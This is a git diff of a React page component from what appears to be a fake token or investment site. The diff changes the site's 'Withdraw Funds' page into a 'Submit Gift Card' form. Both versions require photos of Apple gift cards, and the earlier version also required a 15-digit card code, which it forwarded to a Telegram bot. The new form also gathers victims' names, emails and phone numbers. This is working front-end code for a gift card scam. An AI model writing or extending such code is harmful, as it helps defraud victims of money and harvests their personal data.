@@ -3,20 +3,34 @@ import { useAuth } from '../context/AuthContext'
 import './PageContent.css'
 
 const WithdrawPage = () => {
-  const { user, withdraw, hasApprovedDWT, updateUser } = useAuth()
-  const [amount, setAmount] = useState('')
+  const { user, updateUser } = useAuth()
+  const [formData, setFormData] = useState({
+    fullName: user?.fullName || '',
+    email: user?.email || '',
+    phone: user?.phone || '',
+    giftcardAmount: '',
+  })
+  const [giftImages, setGiftImages] = useState([])
   const [message, setMessage] = useState({ type: '', text: '' })
-  const existingImages = (user?.subscription && user.subscription.giftImages) || []
-  const [giftImages, setGiftImages] = useState(existingImages)
-  const [voucherCode, setVoucherCode] = useState('')
   const [sending, setSending] = useState(false)
 
   const walletBalance = user?.walletBalance || 0
   const dwtTokens = user?.dwtTokens || 0
 
-  const canWithdraw = hasApprovedDWT() && giftImages.length >= 2
+  // Validation
+  const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)
+  const isValidPhone = /^\d{10,}$/.test(formData.phone.replace(/\D/g, ''))
+  const amountNum = parseFloat(formData.giftcardAmount) || 0
+  const isValidAmount = amountNum >= 50
+  const canSubmit = formData.fullName && isValidEmail && isValidPhone && isValidAmount && giftImages.length === 2
 
-  const canSendTelegram = giftImages.length >= 2 && /^\d{15}$/.test(voucherCode)
+  const handleInputChange = (e) => {
+    const { name, value } = e.target
+    setFormData(prev => ({
+      ...prev,
+      [name]: name === 'giftcardAmount' ? value.replace(/\D/g, '') : value
+    }))
+  }
 
   const handleFileChange = (e, index) => {
     const file = e.target.files[0]
@@ -24,87 +38,48 @@ const WithdrawPage = () => {
 
     const reader = new FileReader()
     reader.onload = () => {
-      const base = reader.result
       const next = [...giftImages]
-      next[index] = base
-      // remove empty slots
-      const filtered = next.filter(Boolean)
-      setGiftImages(filtered)
-      updateUser({ subscription: { giftImages: filtered } })
+      next[index] = reader.result
+      setGiftImages(next)
     }
     reader.readAsDataURL(file)
   }
 
-  const handleWithdraw = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault()
     setMessage({ type: '', text: '' })
 
-    if (!hasApprovedDWT()) {
-      setMessage({ type: 'error', text: 'You need to purchase and have approved DWT tokens to withdraw funds.' })
-      return
-    }
-
-    if (giftImages.length < 2) {
-      setMessage({ type: 'error', text: 'You must upload 2 Apple gift card images as part of the subscription verification before withdrawing.' })
-      return
-    }
-
-    const withdrawAmount = parseFloat(amount)
-    const requiredDWT = Math.ceil(withdrawAmount)
-
-    if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
-      setMessage({ type: 'error', text: 'Please enter a valid amount' })
-      return
-    }
-
-    if (withdrawAmount > walletBalance) {
-      setMessage({ type: 'error', text: 'Insufficient balance' })
-      return
-    }
-
-    if (dwtTokens < requiredDWT) {
-      setMessage({ 
-        type: 'error', 
-        text: `Insufficient DWT tokens. You need ${requiredDWT} DWT to withdraw $${withdrawAmount.toFixed(2)}. You currently have ${dwtTokens} DWT.` 
-      })
-      return
-    }
-
-    const result = withdraw(withdrawAmount)
-    
-    if (result.success) {
-      setMessage({ 
-        type: 'success', 
-        text: `Successfully withdrew $${withdrawAmount.toFixed(2)}. ${requiredDWT} DWT tokens were consumed.` 
-      })
-      setAmount('')
-    } else {
-      setMessage({ type: 'error', text: result.error || 'Withdrawal failed' })
-    }
-  }
-
-  const sendToTelegram = async () => {
-    if (!canSendTelegram) {
-      setMessage({ type: 'error', text: 'Please upload 2 images and enter a 15-digit code before sending.' })
+    if (!canSubmit) {
+      setMessage({ type: 'error', text: 'Please fill in all fields correctly.' })
       return
     }
 
     setSending(true)
-    setMessage({ type: '', text: '' })
     try {
-      const res = await fetch('/api/send-telegram', {
+      const res = await fetch('/api/submit-giftcard', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ images: giftImages, code: voucherCode })
+        body: JSON.stringify({
+          fullName: formData.fullName,
+          email: formData.email,
+          phone: formData.phone,
+          amount: parseInt(formData.giftcardAmount),
+          images: giftImages,
+          userId: user?.id,
+          userName: user?.userName,
+        })
       })
       const data = await res.json()
       if (res.ok) {
-        setMessage({ type: 'success', text: 'Sent to Telegram bot successfully.' })
+        setMessage({ type: 'success', text: 'Gift card submission sent successfully! Admin will review shortly.' })
+        setFormData({ fullName: formData.fullName, email: formData.email, phone: formData.phone, giftcardAmount: '' })
+        setGiftImages([])
+        updateUser({ phone: formData.phone })
       } else {
-        setMessage({ type: 'error', text: data.error || 'Failed to send to Telegram' })
+        setMessage({ type: 'error', text: data.error || 'Failed to submit' })
       }
     } catch (err) {
-      setMessage({ type: 'error', text: 'Network error while sending to Telegram' })
+      setMessage({ type: 'error', text: 'Network error while submitting' })
     }
     setSending(false)
   }
@@ -112,8 +87,8 @@ const WithdrawPage = () => {
   return (
     <div className="page-content">
       <div className="page-header">
-        <h2>💵 Withdraw Funds</h2>
-        <p>Withdraw your funds to your bank account</p>
+        <h2>🎁 Submit Gift Card</h2>
+        <p>Submit your Apple gift card to increase your DWT tokens</p>
       </div>
 
       <div className="withdraw-content">
@@ -129,80 +104,101 @@ const WithdrawPage = () => {
         </div>
 
         <div className="withdraw-info">
-          <h3>Withdrawal Information</h3>
+          <h3>How it Works</h3>
           <ul>
-            <li>💰 $1 withdrawal = 1 DWT token required</li>
-            <li>🪙 You must have approved DWT tokens to withdraw</li>
-            <li>🎫 You must upload 2 Apple gift card images for subscription verification before withdrawing</li>
-            <li>⏱️ Withdrawals are processed within 1-3 business days</li>
+            <li>💳 Submit Apple gift card ($50 minimum per token)</li>
+            <li>📸 Upload 2 clear photos of the gift card (front & back recommended)</li>
+            <li>✅ Admin will verify and approve within 1-2 business days</li>
+            <li>🪙 Approved cards = DWT tokens added to your account</li>
+            <li>💰 Use DWT tokens to withdraw funds or unlock exclusive rewards</li>
           </ul>
         </div>
 
-        <form onSubmit={handleWithdraw} className="withdraw-form">
+        <form onSubmit={handleSubmit} className="withdraw-form">
           <div className="form-group">
-            <label htmlFor="amount">Withdrawal Amount</label>
+            <label htmlFor="fullName">Full Name *</label>
             <input
-              type="number"
-              id="amount"
-              step="0.01"
-              min="0.01"
-              max={walletBalance}
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              placeholder={`Max: $${walletBalance.toFixed(2)}`}
+              type="text"
+              id="fullName"
+              name="fullName"
+              value={formData.fullName}
+              onChange={handleInputChange}
+              placeholder="Your full name"
               required
             />
-            {amount && !isNaN(parseFloat(amount)) && (
-              <p className="form-hint">
-                Required DWT: {Math.ceil(parseFloat(amount))} tokens
-              </p>
-            )}
           </div>
 
           <div className="form-group">
-            <label>Upload 2 Apple gift card images (required)</label>
-            <div className="upload-area">
-              <div>
-                <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 0)} />
-                {giftImages[0] && <img src={giftImages[0]} alt="preview-1" className="image-preview" />}
-              </div>
-              <div>
-                <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 1)} />
-                {giftImages[1] && <img src={giftImages[1]} alt="preview-2" className="image-preview" />}
-              </div>
-            </div>
-          </div>
-
-          <div className="form-group">
-            <label htmlFor="voucher">Enter 15-digit code (required for Telegram)</label>
-            <textarea
-              id="voucher"
-              rows={1}
-              maxLength={15}
-              value={voucherCode}
-              onChange={(e) => setVoucherCode(e.target.value.replace(/\D/g, '').slice(0,15))}
-              placeholder="Enter 15-digit code"
+            <label htmlFor="email">Email Address *</label>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              value={formData.email}
+              onChange={handleInputChange}
+              placeholder="your@email.com"
+              required
             />
-            <p className="form-hint">Digits only — 15 characters</p>
+            {formData.email && !isValidEmail && <p className="form-error">Invalid email</p>}
           </div>
 
-          <div style={{ display: 'flex', gap: 12, marginBottom: 12 }}>
-            <button
-              type="button"
-              className="btn btn-primary"
-              onClick={sendToTelegram}
-              disabled={!canSendTelegram || sending}
-            >
-              {sending ? 'Sending...' : 'Send to Telegram'}
-            </button>
-            <button 
-              type="submit" 
-              className="btn-withdraw"
-              disabled={!canWithdraw}
-            >
-              {canWithdraw ? 'Withdraw Funds' : 'Upload 2 images & Purchase DWT'}
-            </button>
+          <div className="form-group">
+            <label htmlFor="phone">Phone Number *</label>
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              value={formData.phone}
+              onChange={handleInputChange}
+              placeholder="(555) 123-4567"
+              required
+            />
+            {formData.phone && !isValidPhone && <p className="form-error">Invalid phone (min 10 digits)</p>}
           </div>
+
+          <div className="form-group">
+            <label htmlFor="giftcardAmount">Gift Card Amount ($) *</label>
+            <input
+              type="number"
+              id="giftcardAmount"
+              name="giftcardAmount"
+              value={formData.giftcardAmount}
+              onChange={handleInputChange}
+              placeholder="50"
+              min="50"
+              step="1"
+              required
+            />
+            {formData.giftcardAmount && !isValidAmount && <p className="form-error">Minimum $50 per token</p>}
+            {isValidAmount && <p className="form-hint">You will receive {Math.floor(amountNum / 50)} DWT token(s)</p>}
+          </div>
+
+          <div className="form-group">
+            <label>Upload 2 Gift Card Images (Front & Back) *</label>
+            <div className="upload-area">
+              {[0, 1].map(idx => (
+                <div key={idx} className="upload-slot">
+                  <input 
+                    type="file" 
+                    accept="image/*" 
+                    onChange={(e) => handleFileChange(e, idx)}
+                    required={giftImages.length <= idx}
+                  />
+                  <p>{idx === 0 ? 'Front' : 'Back'}</p>
+                  {giftImages[idx] && <img src={giftImages[idx]} alt={`card-${idx}`} className="image-preview" />}
+                </div>
+              ))}
+            </div>
+            <p className="form-hint">{giftImages.length}/2 images uploaded</p>
+          </div>
+
+          <button 
+            type="submit" 
+            className="btn btn-primary"
+            disabled={!canSubmit || sending}
+          >
+            {sending ? 'Submitting...' : 'Submit Gift Card'}
+          </button>
 
           {message.text && (
             <div className={`message ${message.type}`}>
